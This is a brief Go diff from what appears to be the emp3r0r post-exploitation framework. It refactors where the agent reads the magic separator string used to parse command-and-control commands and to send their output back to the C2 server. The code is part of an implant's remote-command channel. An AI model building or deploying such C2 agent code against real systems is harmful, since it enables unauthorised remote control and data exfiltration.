@@ -26,7 +26,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	)
 	data2send.Tag = RuntimeConfig.AgentTag
 
-	payloadSplit := strings.Split(data.Payload, RuntimeConfig.MagicString)
+	payloadSplit := strings.Split(data.Payload, emp3r0r_data.MagicString)
 	if len(payloadSplit) <= 1 {
 		log.Printf("Cannot parse CC command: %s, wrong OpSep maybe?", data.Payload)
 		return
@@ -39,11 +39,11 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	// send response to CC
 	sendResponse := func(resp string) {
 		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
-			RuntimeConfig.MagicString,
+			emp3r0r_data.MagicString,
 			strings.Join(cmdSlice, " "),
-			RuntimeConfig.MagicString,
+			emp3r0r_data.MagicString,
 			out)
-		data2send.Payload += RuntimeConfig.MagicString + cmd_id // cmd_id for cmd tracking
+		data2send.Payload += emp3r0r_data.MagicString + cmd_id // cmd_id for cmd tracking
 		if err = Send2CC(&data2send); err != nil {
 			log.Println(err)
 		}
